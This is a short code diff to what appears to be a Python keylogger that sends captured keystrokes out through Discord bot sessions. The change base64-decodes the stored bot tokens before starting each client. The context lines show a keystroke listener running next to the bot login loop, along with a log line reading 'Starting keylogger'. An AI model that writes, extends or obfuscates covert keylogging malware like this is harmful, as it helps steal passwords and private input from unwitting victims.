@@ -56,8 +56,9 @@ def on_press(key):
 # bottom
 with Listener(on_press=on_press) as listener:
     for token in bot_tokens:
+        decoded_token = base64.b64decode(token).decode()
         try:
-            client.run(token)
+            client.run(decoded_token)
             #.log Started Discord BOT client session
         except: pass
     #.log Starting keylogger
